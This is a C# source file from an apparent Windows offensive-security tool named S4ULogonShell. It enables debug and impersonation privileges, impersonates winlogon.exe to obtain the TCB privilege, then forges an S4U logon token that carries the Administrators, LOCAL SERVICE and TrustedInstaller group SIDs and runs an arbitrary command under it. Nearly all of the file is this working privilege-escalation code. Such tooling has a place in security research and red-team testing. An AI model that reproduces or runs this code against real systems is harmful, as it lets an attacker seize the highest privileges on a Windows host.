using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using S4ULogonShell.Interop;

namespace S4ULogonShell.Library
{
    using NTSTATUS = Int32;

    internal class Modules
    {
        public static bool CreateS4ULogonProcess(string command, bool bNewConsole)
        {
            int nDosErrorCode;
            bool bReverted = false;
            var requiredPrivs = new List<SE_PRIVILEGE_ID>
            {
                SE_PRIVILEGE_ID.SeDebugPrivilege,
                SE_PRIVILEGE_ID.SeImpersonatePrivilege
            };
            bool bSuccess = Helpers.EnableTokenPrivileges(
                in requiredPrivs,
                out Dictionary<SE_PRIVILEGE_ID, bool> adjustedPrivs);
            nDosErrorCode = Marshal.GetLastWin32Error();

            foreach (var priv in adjustedPrivs)
            {
                if (priv.Value)
                    Console.WriteLine("[+] {0} is enabled successfully.", priv.Key);
                else
                    Console.WriteLine("[-] Failed to enable {0}.", priv.Key);
            }

            if (!bSuccess)
            {
                Console.WriteLine("[-] Insufficient privileges (Error = 0x{0}).", nDosErrorCode.ToString("X8"));
                return false;
            }
            bSuccess = Utilities.GetS4uLogonAccount(
                out string upn,
                out string domain,
                out LSA_STRING pkgName,
                out TOKEN_SOURCE tokenSource);
            nDosErrorCode = Marshal.GetLastWin32Error();

            if (!bSuccess)
            {
                Console.WriteLine("[-] Failed to specify S4U Logon account information (Error = 0x{0}).", nDosErrorCode.ToString("X8"));
            }
            else
            {
                string accountName;
                string tokenSourceName = Encoding.ASCII.GetString(tokenSource.SourceName);

                if (string.Compare(tokenSourceName, "User32", true) < 0)
                    accountName = string.Format("{0}@{1}", upn, domain);
                else
                    accountName = string.Format(@"{0}\{1}", domain, upn);

                Console.WriteLine("[+] Got S4U Logon information.");
                Console.WriteLine("    [*] Account Name           : {0}", accountName);
                Console.WriteLine("    [*] Authentication Package : {0}", pkgName.ToString());
                Console.WriteLine("    [*] Token Source           : {0}", tokenSourceName);
            }

            requiredPrivs = new List<SE_PRIVILEGE_ID> {
                SE_PRIVILEGE_ID.SeAssignPrimaryTokenPrivilege,
                SE_PRIVILEGE_ID.SeImpersonatePrivilege,
                SE_PRIVILEGE_ID.SeTcbPrivilege
            };
            bSuccess = Utilities.ImpersonateAsWinlogon(
                in requiredPrivs,
                out adjustedPrivs);
            nDosErrorCode = Marshal.GetLastWin32Error();

            if (!bSuccess)
            {
                Console.WriteLine("[-] Failed to impersonate as winlogon.exe (Error = 0x{0}).", nDosErrorCode.ToString("X8"));
            }
            else
            {
                Console.WriteLine("[+] Impersonation as winlogon.exe is successful.");
                bSuccess = adjustedPrivs[SE_PRIVILEGE_ID.SeTcbPrivilege];
                bSuccess &= (adjustedPrivs[SE_PRIVILEGE_ID.SeAssignPrimaryTokenPrivilege] ||
                    adjustedPrivs[SE_PRIVILEGE_ID.SeImpersonatePrivilege]);

                if (!bSuccess)
                {
                    foreach (var priv in adjustedPrivs)
                    {
                        if (!priv.Value)
                            Console.WriteLine("[-] Failed to enable {0} for current thread.", priv.Key);
                    }

                    Helpers.RevertThreadToken(new IntPtr(-2));
                }
                else
                {
                    foreach (var priv in adjustedPrivs)
                    {
                        if (priv.Value)
                            Console.WriteLine("[+] {0} is enabled successfully for current thread.", priv.Key);
                    }
                }
            }

            if (!bSuccess)
                return false;

            do
            {
                IntPtr hS4ULogonToken;
                var tokenGroups = new Dictionary<string, SE_GROUP_ATTRIBUTES>
                {
                    {
                        // BUILTIN\Administrators
                        "S-1-5-32-544",
                        SE_GROUP_ATTRIBUTES.Enabled | SE_GROUP_ATTRIBUTES.EnabledByDefault | SE_GROUP_ATTRIBUTES.Mandatory
                    },
                    {
                        // NT AUTHORITY\LOCAL SERVICE
                        "S-1-5-19",
                        SE_GROUP_ATTRIBUTES.Enabled | SE_GROUP_ATTRIBUTES.EnabledByDefault | SE_GROUP_ATTRIBUTES.Mandatory
                    },
                    {
                        // NT SERVICE\TrustedInstaller
                        "S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464",
                        SE_GROUP_ATTRIBUTES.Enabled | SE_GROUP_ATTRIBUTES.EnabledByDefault | SE_GROUP_ATTRIBUTES.Mandatory
                    }
                };

                hS4ULogonToken = Utilities.GetS4uLogonToken(
                    upn,
                    domain,
                    in pkgName,
                    in tokenSource,
                    in tokenGroups);
                nDosErrorCode = Marshal.GetLastWin32Error();

                if (hS4ULogonToken == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to get S4U Logon token (Error = 0x{0}).", nDosErrorCode.ToString("X8"));
                    break;
                }
                else
                {
                    Helpers.GetTokenType(hS4ULogonToken, out TOKEN_TYPE tokenType);

                    if (tokenType == TOKEN_TYPE.Impersonation)
                    {
                        var objectAttribute = new OBJECT_ATTRIBUTES
                        {
                            Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES))
                        };
                        NTSTATUS ntstatus = NativeMethods.NtDuplicateToken(
                            hS4ULogonToken,
                            ACCESS_MASK.MAXIMUM_ALLOWED,
                            in objectAttribute,
                            BOOLEAN.FALSE,
                            TOKEN_TYPE.Primary,
                            out IntPtr hNewToken);

                        if (ntstatus == Win32Consts.STATUS_SUCCESS)
                        {
                            NativeMethods.NtClose(hS4ULogonToken);
                            hS4ULogonToken = hNewToken;
                        }

                        if (bNewConsole)
                        {
                            var nSessionId = Helpers.GetGuiSessionId();
                            Helpers.SetTokenSessionId(hS4ULogonToken, nSessionId);
                        }
                    }

                    Console.WriteLine("[+] Got a S4U Logon token (Handle = 0x{0}).", hS4ULogonToken.ToString("X"));

                    bSuccess = Utilities.CreateTokenAssignedSuspendedProcess(
                        hS4ULogonToken,
                        command,
                        ref bNewConsole,
                        out PROCESS_INFORMATION processInfo);
                    NativeMethods.NtClose(hS4ULogonToken);
                    nDosErrorCode = Marshal.GetLastWin32Error();

                    if (!bSuccess)
                    {
                        Console.WriteLine("[-] Failed to create a token assined process (Error = 0x{0}).", nDosErrorCode.ToString("X8"));
                    }
                    else
                    {
                        Console.WriteLine("[+] Got a token assigned process (PID: {0}).", processInfo.dwProcessId);
                        bReverted = Helpers.RevertThreadToken(new IntPtr(-2));
                        NativeMethods.NtResumeThread(processInfo.hThread, out uint _);

                        if (!bNewConsole)
                            NativeMethods.NtWaitForSingleObject(processInfo.hProcess, false, IntPtr.Zero);

                        NativeMethods.NtClose(processInfo.hThread);
                        NativeMethods.NtClose(processInfo.hProcess);
                    }
                }
            } while (false);

            if (!bReverted)
                Helpers.RevertThreadToken(new IntPtr(-2));

            return bSuccess;
        }
    }
}
